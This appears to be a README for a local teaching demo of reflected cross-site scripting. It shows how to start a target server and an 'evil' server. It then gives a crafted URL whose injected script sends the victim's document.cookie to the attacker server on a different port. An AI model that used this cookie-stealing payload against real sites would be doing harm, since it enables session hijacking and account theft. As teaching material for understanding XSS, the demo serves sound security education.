# XSS Attack demo

Start the real server:

```
npm i
node app.js
```

Start the evil server in a new terminal session:

```
cd evilserver
node evil.js
```

Open the browser and send a malicious request:

```
http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
```

The cookie information will be sent to the malicious destination.
